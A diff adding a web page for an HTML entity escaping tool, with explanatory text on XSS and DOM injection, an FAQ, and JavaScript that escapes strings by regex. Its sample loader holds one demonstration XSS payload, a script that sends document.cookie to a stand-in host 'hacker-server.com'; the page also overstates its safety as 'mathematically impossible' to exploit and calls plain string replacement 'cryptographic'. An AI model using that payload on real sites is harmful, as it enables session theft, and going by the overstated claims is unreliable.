@@ -1,0 +1,217 @@
+{{HEADER}}
+
+  <main class="hero">
+    <h1>HTML Entity Sanitizer</h1>
+    <p>Securely escape and unescape HTML strings bidirectionally without DOM injection.</p>
+  </main>
+
+  <div class="ide-container">
+    
+    <div class="pane">
+      <div class="pane-header">
+        <div class="pane-title"><i data-lucide="code"></i> Raw HTML</div>
+        <div class="btn-group">
+          <button class="btn" onclick="copyContent('rawInput', this)"><i data-lucide="copy"></i> Copy</button>
+        </div>
+      </div>
+      <textarea id="rawInput" class="editor" placeholder='Type or paste raw HTML here...&#10;&#10;<div class="header">&#10;  <h1>Welcome to Layerbit</h1>&#10;</div>' spellcheck="false"></textarea>
+    </div>
+
+    <div class="pane">
+      <div class="pane-header">
+        <div class="pane-title"><i data-lucide="shield-check"></i> Escaped Entities</div>
+        <div class="btn-group">
+          <button class="btn" onclick="copyContent('escapedInput', this)"><i data-lucide="copy"></i> Copy</button>
+        </div>
+      </div>
+      <textarea id="escapedInput" class="editor" placeholder='Type or paste escaped entities here...&#10;&#10;&lt;div class=&quot;header&quot;&gt;&#10;  &lt;h1&gt;Welcome to Layerbit&lt;/h1&gt;&#10;&lt;/div&gt;' spellcheck="false"></textarea>
+    </div>
+
+  </div>
+
+  <div class="action-bar">
+    <button class="btn-clear" onclick="clearAll()"><i data-lucide="trash-2"></i> Clear Workspace</button>
+  </div>
+
+  <div class="docs-container">
+    <div class="info-panel">
+      <h2><i data-lucide="lock"></i> Zero-Trust Processing Engine</h2>
+      <p>Many online HTML escaping tools use a dangerous method known as DOM injection (<code>element.innerHTML = text</code>) to parse entities. If a malicious script is pasted, the browser might accidentally execute it. Layerbit mitigates this entirely.</p>
+      <ul>
+        <li><i data-lucide="check"></i> <strong>Regex Mapping:</strong> We utilize a strict, high-performance dictionary matrix to convert characters purely at the string level. It is mathematically impossible to trigger an XSS attack using this tool.</li>
+        <li><i data-lucide="check"></i> <strong>Bidirectional Sync:</strong> Paste raw code on the left to secure it for transport, or paste an escaped payload on the right to revert it to readable HTML instantly.</li>
+        <li><i data-lucide="check"></i> <strong>Air-Gapped Operation:</strong> No payload data is ever transmitted to external servers. All cryptographic string manipulation occurs locally.</li>
+      </ul>
+      
+      <div class="use-cases-grid">
+        <div class="use-case-card">
+          <h3><i data-lucide="shield-alert"></i> XSS Vulnerability Prevention</h3>
+          <p>Sanitize raw user input from forms, comments, and text areas before storing it in your database to prevent Cross-Site Scripting (XSS) injection attacks across your application.</p>
+        </div>
+        <div class="use-case-card">
+          <h3><i data-lucide="braces"></i> JSON Payload Escaping</h3>
+          <p>Safely encode complex HTML strings so they can be embedded directly within JSON API payloads without breaking string boundaries or disrupting downstream parsers.</p>
+        </div>
+        <div class="use-case-card">
+          <h3><i data-lucide="monitor-dot"></i> Frontend Code Display</h3>
+          <p>Convert raw HTML elements into secure, escaped entities so they render visibly as code blocks in the DOM rather than being interpreted and executed by the browser engine.</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="info-panel">
+      <h2><i data-lucide="test-tube"></i> Quick Testing Templates</h2>
+      <p>Test the sanitizer's regex capabilities. Click the templates below to load payloads directly into the workspace.</p>
+      <div>
+        <button class="sample-btn" onclick="loadSample('html')">Standard HTML Block</button>
+        <button class="sample-btn" onclick="loadSample('xss')">Malicious XSS Payload</button>
+      </div>
+    </div>
+
+    <div class="info-panel">
+      <h2><i data-lucide="help-circle"></i> Frequently Asked Questions</h2>
+      <div class="faq-container">
+        
+        <div class="faq-item">
+          <button class="faq-question">Why is DOM injection dangerous for sanitizing tools? <i data-lucide="chevron-down"></i></button>
+          <div class="faq-answer">
+            <p>If an online tool sets your pasted text to <code>element.innerHTML</code> in order to read the browser's parsed entities, any valid <code>&lt;script&gt;</code> tags or inline event handlers (like <code>onload</code>) within your text can immediately execute in the browser. Layerbit operates strictly on regex string replacement to prevent arbitrary execution.</p>
+          </div>
+        </div>
+
+        <div class="faq-item">
+          <button class="faq-question">Which HTML characters are actively escaped? <i data-lucide="chevron-down"></i></button>
+          <div class="faq-answer">
+            <p>The matrix targets the most critical control characters utilized in HTML rendering and script execution: Ampersands (<code>&amp;</code>), less than/greater than symbols (<code>&lt; &gt;</code>), double/single quotes (<code>" '</code>), forward slashes (<code>/</code>), backticks (<code>`</code>), and equals signs (<code>=</code>).</p>
+          </div>
+        </div>
+
+        <div class="faq-item">
+          <button class="faq-question">Is client-side escaping enough to secure my database? <i data-lucide="chevron-down"></i></button>
+          <div class="faq-answer">
+            <p>No. While this tool is perfect for ad-hoc preparation and debugging, enterprise applications should <strong>never</strong> trust client-side input exclusively. You must always sanitize strings on your backend server before executing SQL inserts or NoSQL document updates.</p>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+    <div class="info-panel">
+      <h2><i data-lucide="git-commit"></i> Changelog</h2>
+      <ul class="changelog-list">
+        <li><span class="changelog-tag">v1.2.0</span> Upgraded the rendering engine to provide bidirectional synchronization without infinite loop conflicts.</li>
+        <li><span class="changelog-tag">v1.1.0</span> Expanded the regex dictionary matrix to capture backticks and equals signs to mitigate advanced injection variants.</li>
+        <li><span class="changelog-tag">v1.0.0</span> Initial deployment of the zero-trust string replacement matrix.</li>
+      </ul>
+    </div>
+  </div>
+
+  <a id="smartBackBtn" class="fab home-fab-premium" aria-label="Command Center" title="Command Center" href="../">
+    <svg width="26" height="26" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="filter: drop-shadow(0 0 8px rgba(56, 189, 248, 0.5));">
+      <path d="M12 2L2 7l10 5 10-5-10-5z" stroke="#38bdf8" stroke-width="2" stroke-linejoin="round" fill="rgba(56,189,248,0.2)"/>
+      <path d="M2 17l10 5 10-5M2 12l10 5 10-5" stroke="#94a3b8" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+    </svg>
+  </a>
+
+  {{FOOTER}}
+
+  <script src="../js/shared.js"></script>
+
+
+  <script>
+        const rawInput = document.getElementById("rawInput");
+    const escapedInput = document.getElementById("escapedInput");
+
+    let isSyncing = false; // Flag to prevent infinite loop
+
+    // High-performance mapping dictionaries
+    const escapeMap = {
+      '&': '&amp;',
+      '<': '&lt;',
+      '>': '&gt;',
+      '"': '&quot;',
+      "'": '&#39;',
+      '/': '&#x2F;',
+      '`': '&#x60;',
+      '=': '&#x3D;'
+    };
+
+    const unescapeMap = {
+      '&amp;': '&',
+      '&lt;': '<',
+      '&gt;': '>',
+      '&quot;': '"',
+      '&#39;': "'",
+      '&#x2F;': '/',
+      '&#x60;': '`',
+      '&#x3D;': '='
+    };
+
+    function safeEscapeHTML(str) {
+      return String(str).replace(/[&<>"'`=\/]/g, function (s) {
+        return escapeMap[s];
+      });
+    }
+
+    function safeUnescapeHTML(str) {
+      return String(str).replace(/&(amp|lt|gt|quot|#39|#x2F|#x60|#x3D);/g, function (s) {
+        return unescapeMap[s];
+      });
+    }
+
+    // Engine: Raw -> Escaped
+    rawInput.addEventListener("input", () => {
+      if (isSyncing) return;
+      isSyncing = true;
+      escapedInput.value = safeEscapeHTML(rawInput.value);
+      isSyncing = false;
+    });
+
+    // Engine: Escaped -> Raw
+    escapedInput.addEventListener("input", () => {
+      if (isSyncing) return;
+      isSyncing = true;
+      rawInput.value = safeUnescapeHTML(escapedInput.value);
+      isSyncing = false;
+    });
+
+    // Utilities
+    function clearAll() {
+      rawInput.value = "";
+      escapedInput.value = "";
+    }
+
+    function copyContent(elementId, btnElement) {
+      const text = document.getElementById(elementId).value;
+      if (!text) return;
+      
+      navigator.clipboard.writeText(text).then(() => {
+        const originalText = btnElement.innerHTML;
+        btnElement.innerHTML = '<i data-lucide="check"></i> Copied!';
+        lucide.createIcons();
+        setTimeout(() => {
+          btnElement.innerHTML = originalText;
+          lucide.createIcons();
+        }, 2000);
+      });
+    }
+
+    // FAQ Accordion Logic
+    
+    // Sample Loader Logic
+    function loadSample(type) {
+      const samples = {
+        html: "<div class=\"hero-banner\">\n  <h1>Welcome to the Dashboard</h1>\n  <p>Click <a href=\"/login\">here</a> to securely authenticate.</p>\n</div>",
+        xss: "<script>\n  alert('Malicious XSS Payload Executed!');\n  fetch('http://hacker-server.com?cookie=' + document.cookie);\n<\/script>"
+      };
+      
+      rawInput.value = samples[type];
+      
+      // Trigger event to force auto-conversion
+      rawInput.dispatchEvent(new Event('input'));
+      
+      // Scroll to top to see action
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+  </script>
+<script src="../main.js"></script>
